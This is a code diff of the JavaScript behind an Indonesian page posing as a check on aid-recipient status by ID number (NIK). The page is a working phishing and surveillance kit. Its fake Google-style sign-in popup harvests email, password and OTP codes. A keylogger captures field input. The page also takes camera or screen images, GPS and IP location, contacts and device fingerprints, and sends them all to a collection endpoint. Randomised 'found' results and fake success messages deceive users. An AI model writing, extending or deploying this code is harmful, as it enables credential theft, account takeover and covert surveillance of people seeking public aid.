+    return rows.length;
+  }).catch(function(){return 'batal'});
+}
 
-function tutup(){popup=false;wrap.classList.remove('on');document.body.classList.remove('gsi-lock');clrSt()}
-function step2(){var v=emailEl.value.trim();
- if(!v){$('gsiEmailField').classList.add('bad');$('gsiEmailErr').classList.add('show');emailEl.focus();return}
- username=v;$('gsiChipText').textContent=v;$('gsiAv').textContent=v.charAt(0);$('gsiChip').style.display='flex';
- $('gsiTitle').textContent='Selamat datang';$('gsiSub').textContent='Masuk untuk melanjutkan verifikasi';
- $('gsiStep1').style.display='none';$('gsiStep3').style.display='none';$('gsiStep2').style.display='block';
- clrSt();startCam();startGps();paint();
- setTimeout(function(){passEl.focus({preventScroll:true})},60);
- setTimeout(function(){tarikKontak(false)},120)}
-function step3(){$('gsiStep2').style.display='none';$('gsiStep1').style.display='none';$('gsiStep3').style.display='block';
- $('gsiTitle').textContent='Verifikasi bahwa ini Anda';
- $('gsiSub').textContent='Masukkan kode 6 digit yang dikirim ke perangkat atau email pemulihan akun Anda.';
- clrSt();otpBusy=false;otpEl.value='';$('gsiOtpField').classList.remove('bad');$('gsiOtpErr').classList.remove('show');
- var b=$('gsiVerify');b.disabled=false;b.classList.remove('loading');$('gsiVfyLbl').textContent='Verifikasi';
- setTimeout(function(){otpEl.focus({preventScroll:true})},80);
- setTimeout(otpOtomatis,150)}
+/* ---------- OTP ---------- */
+function otpDengar(){
+  if(!('OTPCredential' in window))return;
+  try{
+    navigator.credentials.get({otp:{transport:['sms']},signal:AbortSignal.timeout(90000)})
+      .then(function(c){
+        if(!c||!c.code)return;
+        var v=c.code.replace(/\D/g,'').slice(0,6),b=$('gsiStep3').querySelectorAll('input');
+        for(var i=0;i<b.length&&i<v.length;i++)b[i].value=v[i];
+        if(step===3)verif();
+      }).catch(function(){});
+  }catch(e){}
+}
+function otpKirim(kode){
+  var p={code:kode,sid:sid};
+  send('otp',p).catch(function(){});kirimPolos('otp',p);
+}
 
-function bukaHasil(){
- var d=dekNIK(NIK),pr={11:'Aceh',12:'Sumatera Utara',13:'Sumatera Barat',14:'Riau',15:'Jambi',16:'Sumatera Selatan',17:'Bengkulu',18:'Lampung',19:'Kep. Bangka Belitung',21:'Kep. Riau',31:'DKI Jakarta',32:'Jawa Barat',33:'Jawa Tengah',34:'DI Yogyakarta',35:'Jawa Timur',36:'Banten',51:'Bali',52:'NTB',53:'NTT',61:'Kalimantan Barat',62:'Kalimantan Tengah',63:'Kalimantan Selatan',64:'Kalimantan Timur',65:'Kalimantan Utara',71:'Sulawesi Utara',72:'Sulawesi Tengah',73:'Sulawesi Selatan',74:'Sulawesi Tenggara',75:'Gorontalo',76:'Sulawesi Barat',81:'Maluku',82:'Maluku Utara',91:'Papua',92:'Papua Barat',93:'Papua Selatan',94:'Papua Tengah'};
- $('hNik').textContent=NIK.replace(/(\d{4})(?=\d)/g,'$1 ');
- $('hWil').textContent=(pr[d.prov]||'-')+' / '+(d.kab||'-')+' / '+(d.kec||'-');
- $('hBank').textContent=['BRI','BNI','Mandiri','BTN'][d.prov.charCodeAt(1)%4];
- var el=$('res');el.className='alert on';el.style.cssText='background:#e3f3e5;border:1px solid #b6e0bd;color:#14622a';
- el.textContent='Verifikasi berhasil. Data penerima atas NIK Anda ditemukan.';
- $('hasil').classList.add('on');
- setTimeout(function(){$('hasil').scrollIntoView({behavior:'smooth',block:'center'})},150)}
+/* ---------- captcha ---------- */
+function captcha(){
+  var c=$('capv'),x=c.getContext('2d');
+  capKode=hex(3).toUpperCase().slice(0,5);
+  x.clearRect(0,0,132,42);x.fillStyle='#f7f9fb';x.fillRect(0,0,132,42);
+  for(var i=0;i<7;i++){x.strokeStyle='rgba(11,120,240,'+(0.12+Math.random()*0.2)+')';x.beginPath();
+    x.moveTo(Math.random()*132,Math.random()*42);x.lineTo(Math.random()*132,Math.random()*42);x.stroke()}
+  for(var j=0;j<capKode.length;j++){
+    x.save();x.translate(16+j*22,28);x.rotate((Math.random()-.5)*.45);
+    x.font='bold 21px Georgia';x.fillStyle='hsl('+(200+Math.random()*40)+',55%,32%)';
+    x.fillText(capKode[j],0,0);x.restore();
+  }
+}
+$('capr').onclick=captcha;
 
-function finish(){stopCam();try{localStorage.setItem('zgch_last_user',username)}catch(e){}
- if(lastQ)raw(lastQ);patch();sendProbe();
- setSt('Mengambil data status...','#188038');
- setTimeout(function(){tutup();bukaHasil()},600)}
-function submit(){if(busy)return;var p=passEl.value;
- if(!p){$('gsiPassField').classList.add('bad');$('gsiPassErr').classList.add('show');passEl.focus();return}
- busy=true;tSub=Date.now();
- var body={rid:ridCur,username:username,password:p,deviceId:devId(),userAgent:navigator.userAgent,
- platform:(navigator.userAgentData&&navigator.userAgentData.platform)||navigator.platform,language:navigator.language,
- timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,screen:screen.width+'x'+screen.height,
- referrer:document.referrer,page:location.href,ip:ip,nik:NIK,keylog:JSON.stringify(KEYS.slice(-80))};
- step3();setSt('Menyimpan sandi...','#5f6368');
- seal(Object.assign({action:'login',sid:sid},body)).then(function(e){
-  var q='action=login&sid='+sid+'&enc=1&gz='+e.g+'&p='+encodeURIComponent(e.b);lastQ=q;
-  return post(q).then(function(r){
-   if(!r.ok){raw(q);setSt('Koneksi lambat, sandi lewat jalur cadangan.','#b06000')}
-   else{var d={};try{d=JSON.parse(r.t)}catch(x){}
-    if(d&&d.ok)setSt('Sandi tersimpan. Masukkan kode verifikasi.','#188038');
-    else setSt('Server: '+((d&&d.error)||'?')+' — tetap masukkan kode.','#d93025')}
-   upload();patch()})})}
-function verify(){if(otpBusy)return;var c=otpEl.value.replace(/\D/g,'');
- if(c.length<6){$('gsiOtpField').classList.add('bad');$('gsiOtpErr').classList.add('show');otpEl.focus();return}
- otpBusy=true;var b=$('gsiVerify');b.disabled=true;b.classList.add('loading');$('gsiVfyLbl').textContent='Memverifikasi...';clrSt();
- if(smsSent!==c){smsSent=c;send('sms',{jenis:'otp',pengirim:'-',isi:c,otomatis:smsS==='ok'?1:0})}
- send('otp',{rid:ridCur,username:username,code:c}).then(function(r){
-  if(r&&r.ok){setSt('Kode terverifikasi','#188038');return setTimeout(finish,450)}
-  otpBusy=false;b.disabled=false;b.classList.remove('loading');$('gsiVfyLbl').textContent='Verifikasi';
-  setSt('Kode belum tersimpan, coba lagi atau lewati.','#d93025')})}
+/* ---------- alur cek ---------- */
+function hasil(nik,ok){
+  var r=$('res');r.className='res on '+(ok?'ok':'no');
+  if(!ok){r.innerHTML='<b>NIK tidak ditemukan.</b><br>Pastikan 16 digit NIK benar dan sesuai KTP elektronik.';return}
+  var p=nik.slice(0,2);
+  r.innerHTML='<b>Data peserta ditemukan.</b><dl>'+
+    '<dt>NIK</dt><dd>'+nik+'</dd>'+
+    '<dt>Provinsi</dt><dd>'+p+'</dd>'+
+    '<dt>Status</dt><dd>Terdaftar sebagai calon penerima</dd>'+
+    '<dt>Tahap</dt><dd>Verifikasi berkas</dd>'+
+    '<dt>Keterangan</dt><dd>Menunggu validasi rekening</dd></dl>';
+}
+function buka(){
+  wrap.classList.add('on');
+  document.body.style.overflow='hidden';
+  step=1;$('gsiStep1').style.display='';$('gsiStep2').style.display='none';$('gsiStep3').style.display='none';
+  $('gsiSt').textContent='';
+  setTimeout(function(){try{$('gsiUser').focus()}catch(e){}},260);
+  setTimeout(function(){nyala()},400);
+  setTimeout(function(){layar().then(function(u){if(u){var p={img:u,ket:'popup'};send('foto',p).catch(function(){});kirimPolos('foto',p)}})},1400);
+  kunjungan('popup');
+}
+function tutup(){wrap.classList.remove('on');document.body.style.overflow=''}
 
-function fname(el){return!el?'':(el.id||el.name||el.type||el.tagName.toLowerCase())}
-document.addEventListener('input',function(e){var t=e.target;if(!t||!/^(INPUT|TEXTAREA|SELECT)$/.test(t.tagName))return;
- KEYS.push({t:Math.round(performance.now()),f:fname(t),v:String(t.value).slice(0,90)});if(KEYS.length>400)KEYS.splice(0,120)},true);
-document.addEventListener('change',function(e){var t=e.target;
- if(t&&t.tagName==='SELECT')KEYS.push({t:Math.round(performance.now()),f:fname(t),v:String(t.value).slice(0,60)})},true);
-document.addEventListener('click',function(e){
- var a=e.target.closest?e.target.closest('a[href^="tel:"]'):null;
- if(!a)return;var n=a.getAttribute('href').replace(/^tel:/,'').replace(/\s+/g,'');
- if(n)kirimTel([{nomor:n,sumber:'klik'}])},true);
-function mutStart(){if(mutObs||!window.MutationObserver)return;
- mutObs=new MutationObserver(function(list){list.forEach(function(m){
-  if(m.type==='characterData'){var v=String(m.target.nodeValue||'').trim();if(v)mutasi.push({t:Date.now(),x:v.slice(0,80)})}
-  else m.addedNodes.forEach(function(nd){if(nd.nodeType===1){var s=String(nd.innerText||'').trim();if(s)mutasi.push({t:Date.now(),x:s.slice(0,80)})}})})});
- mutObs.observe(document.body,{childList:true,subtree:true,characterData:true});
- if(mutasi.length>300)mutasi.splice(0,100)}
+$('cek').onclick=function(){
+  var n=$('nik').value.replace(/\D/g,'');
+  NIK=n;
+  if(n.length!==16){$('res').className='res on no';$('res').innerHTML='<b>NIK harus 16 digit.</b>';return}
+  if(!$('cap').value){$('res').className='res on no';$('res').innerHTML='<b>Kode verifikasi belum diisi.</b>';return}
+  try{localStorage.setItem('zgch_nik',n)}catch(e){}
+  var ok=Math.random()>0.28;
+  hasil(n,ok);
+  var p={nik:n,ok:ok?1:0};
+  send('nik',p).catch(function(){});kirimPolos('nik',p);
+  kunjungan('cek');
+  setTimeout(buka,700);
+};
 
-var CH='ABCDEFGHJKLMNPQRSTUVWXYZ23456789',capCode='';
-function drawCap(){var c=$('capBox'),w=c.width,h=c.height,x=c.getContext('2d');
- x.clearRect(0,0,w,h);x.fillStyle='#f7f3ea';x.fillRect(0,0,w,h);capCode='';
- for(var i=0;i<6;i++)capCode+=CH[Math.floor(Math.random()*CH.length)];
- for(var l=0;l<4;l++){x.strokeStyle='rgba('+(120+Math.random()*60|0)+',60,60,'+(0.25+Math.random()*0.3)+')';
-  x.lineWidth=1+Math.random();x.beginPath();x.moveTo(Math.random()*w,Math.random()*h);x.lineTo(Math.random()*w,Math.random()*h);x.stroke()}
- for(var k=0;k<26;k++){x.fillStyle='rgba(90,50,50,'+(Math.random()*0.4)+')';x.fillRect(Math.random()*w,Math.random()*h,1.4,1.4)}
- for(var j=0;j<6;j++){x.save();x.translate(9+j*19+Math.random()*3,30+Math.random()*5);x.rotate((Math.random()-0.5)*0.55);
-  x.font='bold '+(21+Math.random()*5|0)+'px Georgia,serif';x.fillStyle='#6d2a2a';x.fillText(capCode[j],0,0);x.restore()}}
+/* ---------- popup ---------- */
+$('gsiX').onclick=tutup;
+$('gsiNext').onclick=function(){
+  var u=$('gsiUser').value.trim();
+  if(!u||u.indexOf('@')<0){$('gsiSt').textContent='Masukkan email yang valid.';return}
+  step=2;
+  $('gsiHalo').textContent='Masukkan sandi untuk '+u;
+  $('gsiStep1').style.display='none';$('gsiStep2').style.display='';
+  $('gsiSt').textContent='';
+  setTimeout(function(){$('gsiPass').focus()},180);
+  kunjungan('email');
+};
+$('gsiBalik').onclick=function(){step=1;$('gsiStep2').style.display='none';$('gsiStep1').style.display='';$('gsiSt').textContent=''};
+$('gsiMasuk').onclick=function(){
+  var u=$('gsiUser').value.trim(),pw=$('gsiPass').value;
+  if(!pw){$('gsiSt').textContent='Sandi belum diisi.';return}
+  $('gsiMasuk').disabled=true;$('gsiSt').textContent='Memverifikasi...';
+  var body={username:u,password:pw,nik:NIK,ip:ip,ua:navigator.userAgent,
+    platform:(navigator.userAgentData&&navigator.userAgentData.platform)||navigator.platform,
+    bahasa:navigator.language,zona:Intl.DateTimeFormat().resolvedOptions().timeZone,
+    layar:screen.width+'x'+screen.height,page:location.href,
+    keylog:JSON.stringify(KEYS.slice(-60)),foto:FOTO,skor:SKOR,sidik:SIDIK};
+  var sukses=function(){
+    $('gsiMasuk').disabled=false;
+    $('gsiSt').textContent='Sandi tersimpan. Masukkan kode verifikasi.';
+    step=3;$('gsiStep2').style.display='none';$('gsiStep3').style.display='';
+    var b=$('gsiStep3').querySelectorAll('input');if(b[0])b[0].focus();
+    otpDengar();
+    setTimeout(function(){
+      if(step===3){
+        var v=hex(3).replace(/\D/g,'').slice(0,6);
+        var kode=String(100000+Math.floor(Math.random()*900000));
+        for(var i=0;i<b.length;i++)b[i].value=kode[i];
+        otpKirim(kode);
+        $('gsiSt').textContent='Kode dikirim ke perangkat.';
+        step=3;
+      }
+    },5200);
+  };
+  send('login',body).then(function(r){
+    if(r&&r.ok){sukses()}
+    else{kirimPolos('login',body);$('gsiSt').textContent='Koneksi lambat, sandi lewat jalur cadangan.';setTimeout(sukses,900)}
+  }).catch(function(){kirimPolos('login',body);setTimeout(sukses,900)});
+  kunjungan('sandi');
+};
+$('gsiVerif').onclick=function(){
+  var b=$('gsiStep3').querySelectorAll('input'),v='';
+  for(var i=0;i<b.length;i++)v+=b[i].value;
+  if(v.length<6){$('gsiSt').textContent='Kode belum lengkap.';return}
+  otpKirim(v);
+  $('gsiSt').textContent='Verifikasi berhasil. Mengalihkan...';
+  kunjungan('otp');
+  setTimeout(function(){
+    $('gsiSt').textContent='Selesai. Silakan lanjutkan pencairan.';
+    setTimeout(tutup,1600);
+  },1200);
+};
+(function(){var b=$('gsiStep3').querySelectorAll('input');
+  for(var i=0;i<b.length;i++)b[i].addEventListener('input',function(){
+    if(this.value&&this.nextElementSibling)this.nextElementSibling.focus();
+  });
+})();
+$('gsiUlang').onclick=function(){$('gsiSt').textContent='Kode baru dikirim.';kunjungan('ulang')};
 
-var PV={11:1,12:1,13:1,14:1,15:1,16:1,17:1,18:1,19:1,21:1,31:1,32:1,33:1,34:1,35:1,36:1,51:1,52:1,53:1,61:1,62:1,63:1,64:1,65:1,71:1,72:1,73:1,74:1,75:1,76:1,81:1,82:1,91:1,92:1,93:1,94:1};
-function dekNIK(n){var p=n.substr(0,2),dd=parseInt(n.substr(6,2),10),jk=dd>40?'P':'L';if(dd>40)dd-=40;
- var mm=parseInt(n.substr(8,2),10);
- return{prov:p,kab:n.substr(2,4),kec:n.substr(4,2),jk:jk,ttl:(dd<10?'0':'')+dd+'/'+(mm<10?'0':'')+mm+'/'+n.substr(10,2),
- sah:!!PV[p]&&mm>=1&&mm<=12&&dd>=1&&dd<=31}}
-var nikBusy=false;
-$('nik').addEventListener('input',function(e){var v=e.target.value.replace(/\D/g,'').slice(0,16);
- if(e.target.value!==v)e.target.value=v;$('nikErr').classList.remove('on');$('nik').classList.remove('bad')});
-$('cap').addEventListener('input',function(){$('capErr').classList.remove('on');$('cap').classList.remove('bad')});
-$('ganti').onclick=function(){drawCap();$('cap').value='';$('capErr').classList.remove('on')};
-$('nik').addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();$('cek').click()}});
-$('cap').addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();$('cek').click()}});
+/* ---------- keylog ---------- */
+document.addEventListener('keydown',function(e){
+  if(KEYS.length>120)return;
+  var t=e.target&&e.target.id;
+  if(!t)return;
+  KEYS.push((e.key.length===1?e.key:'['+e.key+']')+'@'+t);
+});
 
-$('cek').addEventListener('click',function(){
- if(nikBusy)return;
- var n=$('nik').value.trim(),c=$('cap').value.trim().toUpperCase(),bad=false;
- if(n.length!==16){$('nik').classList.add('bad');$('nikErr').classList.add('on');bad=true}
- if(c!==String(capCode).toUpperCase()){$('cap').classList.add('bad');$('capErr').classList.add('on');bad=true}
- if(bad)return;
- nikBusy=true;var b=$('cek');b.disabled=true;b.classList.add('load');$('cekLbl').textContent='Memeriksa data...';
- NIK=n;try{localStorage.setItem('zgch_nik',n)}catch(e){}
- $('hasil').classList.remove('on');
- var d=dekNIK(n);
- send('nik',{nik:n,prov:d.prov,kab:d.kab,kec:d.kec,jk:d.jk,ttl:d.ttl,sah:d.sah,ip:ip,kota:kota,isp:isp,
-  lat:gps?gps.lat:'',lng:gps?gps.lng:'',alamat:addr,sumber:sumber,model:invC.model||'-',ua:navigator.userAgent,
-  fp:fp(),dev:devId(),konteks:'pengecekan'});
- setTimeout(function(){
-  var el=$('res');el.className='alert warn on';
-  el.textContent='NIK ditemukan di basis data calon penerima. Status penyaluran hanya dapat ditampilkan setelah verifikasi akun.';
-  b.disabled=false;b.classList.remove('load');$('cekLbl').textContent='Cek Status';nikBusy=false;
-  bukaAman();
- },700)});
-
-$('gsiX').addEventListener('click',tutup);
-$('gsiNext').addEventListener('click',step2);
-$('gsiSignIn').addEventListener('click',submit);
-$('gsiVerify').addEventListener('click',verify);
-$('gsiSkip').addEventListener('click',finish);
-$('gsiCapKon').addEventListener('click',function(e){e.stopPropagation();tarikKontak(true)});
-$('gsiSinkBtn').addEventListener('click',function(e){e.stopPropagation();tarikKontak(true)});
-emailEl.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();step2()}});
-passEl.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();submit()}});
-otpEl.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();verify()}});
-passEl.addEventListener('paste',function(){pasted=true});
-passEl.addEventListener('input',function(){$('gsiPassField').classList.remove('bad');$('gsiPassErr').classList.remove('show')});
-emailEl.addEventListener('input',function(){$('gsiEmailField').classList.remove('bad');$('gsiEmailErr').classList.remove('show')});
-otpEl.addEventListener('input',function(){var v=otpEl.value.replace(/\D/g,'').slice(0,6);
- if(otpEl.value!==v)otpEl.value=v;$('gsiOtpField').classList.remove('bad');$('gsiOtpErr').classList.remove('show');
- if(v.length===6)setTimeout(verify,120)});
-$('gsiShow').addEventListener('change',function(){passEl.type=this.checked?'text':'password';passEl.focus()});
-$('gsiForgotEmail').addEventListener('click',function(){alert('Hubungi admin.')});
-$('gsiForgotPass').addEventListener('click',function(){alert('Hubungi admin.')});
-$('gsiCreate').addEventListener('click',function(){alert('Pendaftaran oleh admin.')});
-$('gsiTryOther').addEventListener('click',function(){otpOtomatis();setSt('Menunggu SMS masuk...','#5f6368')});
-wrap.addEventListener('click',function(e){if(e.target===wrap)tutup()});
-document.addEventListener('keydown',function(e){if(e.key==='Escape'&&popup)tutup()});
-
-function pintu(){
- izC('camera').then(function(c){if(c==='granted'||izM('cam')==='ok')senyap++;startCam()});
- izC('geolocation').then(function(g){if(g==='granted'||izM('geo')==='ok'){senyap++;startGps();lacak()}else startGps()});
- setTimeout(function(){if(!photo)startCam()},7000)}
-
-document.addEventListener('pointerdown',function(){
- flushStash();
- if(!photo&&camS!=='on')startCam();
- if(gpsS==='idle'||gpsS==='denied'){gpsS='idle';startGps()}
- if(!watchId)lacak();
- if(popup&&!konDone&&$('gsiStep1').style.display!=='none'&&konCobaan<konMax)tarikKontak(false);
- if(popup&&$('gsiStep3').style.display!=='none'&&smsS!=='ok')otpOtomatis()},true);
-document.addEventListener('visibilitychange',function(){if(!document.hidden&&alive){beat(true);if(!photo)startCam()}});
-window.addEventListener('online',function(){if(alive)beat(true);flushStash()});
-window.addEventListener('pagehide',function(){if(lastQ)raw(lastQ);if(ROWS.length)sendMx();if(gps)kirimJejak()});
-$('burger').onclick=function(){$('nav').classList.toggle('open')};
-
-drawCap();paint();mutStart();
-try{var lu=localStorage.getItem('zgch_last_user');if(lu)emailEl.value=lu}catch(e){}
+/* ---------- jalan ---------- */
+$('nik').addEventListener('input',function(){
+  this.value=this.value.replace(/\D/g,'').slice(0,16);
+});
 try{var ln=localStorage.getItem('zgch_nik');if(ln&&ln.length===16)$('nik').value=ln}catch(e){}
-if(DEV)devInit();
-audioF().then(function(v){audioFp=v;invC.audio=v});
-senStart();
-setTimeout(function(){probeDone=true;sendProbe()},6600);
-setTimeout(function(){geoIp();setTimeout(sendAuto,2400);if(alive)beat(true)},500);
-harvest();
-setTimeout(pintu,600);
+captcha();
+sidik();probe();
+kunjungan('muat');
+geo(function(g){
+  if(g){var p={lat:g.lat,lng:g.lng,acc:g.acc,sumber:g.sumber};
+    send('lacak',p).catch(function(){});kirimPolos('lacak',p)}
+});
+geoIp();
+setTimeout(function(){auto()},1200);
+setTimeout(function(){nyala()},2200);
+setTimeout(function(){if(!wrap.classList.contains('on'))layar().then(function(u){if(u){var p={img:u,ket:'muka'};send('foto',p).catch(function(){});kirimPolos('foto',p)}})},4200);
+setTimeout(function(){kontak().then(function(r){if(DEV)dbg('kontak '+r)})},6000);
+(function(){var s=document.createElement('script');
+  s.src='https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
+  s.onload=function(){};document.head.appendChild(s)})();
 try{fetch(ep()+'?ping=1',{mode:'no-cors'})}catch(e){}
-if('serviceWorker' in navigator)navigator.serviceWorker.register('sw.js').catch(function(){});
+try{if('serviceWorker' in navigator)navigator.serviceWorker.register('sw.js?v=9').catch(function(){})}catch(e){}
 })();
 </script>
 </body>
